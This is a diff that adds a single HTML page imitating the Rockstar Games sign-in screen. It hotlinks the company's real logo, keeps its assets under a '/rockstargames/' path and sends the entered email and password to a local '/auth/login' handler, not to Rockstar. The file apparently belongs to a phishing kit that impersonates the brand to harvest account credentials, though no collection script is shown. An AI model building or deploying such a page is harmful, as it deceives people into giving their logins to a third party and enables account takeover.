@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Rockstar Games</title>
+  <link rel="stylesheet" href="/rockstargames/style.css">
+</head>
+<body>
+  <main class="page">
+    <!-- Rockstar-style logo -->
+    <div class="brand" aria-label="Rockstar Games">
+      <img src="https://s.rsg.sc/auth/images/logo_20231030.svg">
+    </div>
+
+    <section class="login-card">
+      
+      <h1>Sign In</h1>
+
+      <form id="loginForm" action="/auth/login" method="post">
+        <label class="field">
+          <span class="sr-only">Email</span>
+          <input type="email" name="login" placeholder="Email" autocomplete="email">
+        </label>
+
+        <label class="field password-field">
+          <span class="sr-only">Password</span>
+          <input id="password" name="password" type="password" placeholder="Password" autocomplete="current-password">
+          <button class="eye-button" type="button" id="togglePassword" aria-label="Show password">
+            <svg viewBox="0 0 24 24">
+              <path d="M2.2 12s3.4-5.5 9.8-5.5S21.8 12 21.8 12 18.4 17.5 12 17.5 2.2 12 2.2 12Z"/>
+              <circle cx="12" cy="12" r="2.5"/>
+              <path d="M4 4L20 20"/>
+            </svg>
+          </button>
+        </label>
+
+        <label class="remember">
+          <input type="checkbox">
+          <span>Keep me signed in</span>
+        </label>
+
+        <div class="form-bottom">
+          <a href="#" class="forgot">Forgot your password?</a>
+          <button class="signin-button" type="submit">Sign in</button>
+        </div>
+      </form>
+    </section>
+
+    <section class="social-card">
+      <span>Sign in using</span>
+
+      <div class="providers">
+        <button class="provider playstation" aria-label="Sign in with PlayStation">
+
+          <img src="/rockstargames/images/ps.svg" class="icon_ps">
+
+        </button>
+
+        <button class="provider xbox" aria-label="Sign in with Xbox">
+          <img src="/rockstargames/images/xbox.svg" class="icon_xbox">
+        </button>
+      </div>
+    </section>
+
+    <p class="signup">
+      Don't have a Rockstar Games account?
+      <a href="#">Create a new account</a>
+    </p>
+    <p class="footer-links">
+      © 2026 ROCKSTAR GAMES |
+      <a href="#">PRIVACY POLICY</a> |
+      <a href="#">TERMS OF SERVICE</a> |
+      <a href="#">COOKIE SETTINGS</a>
+    </p>
+  </main>
+
+</body>
+</html>
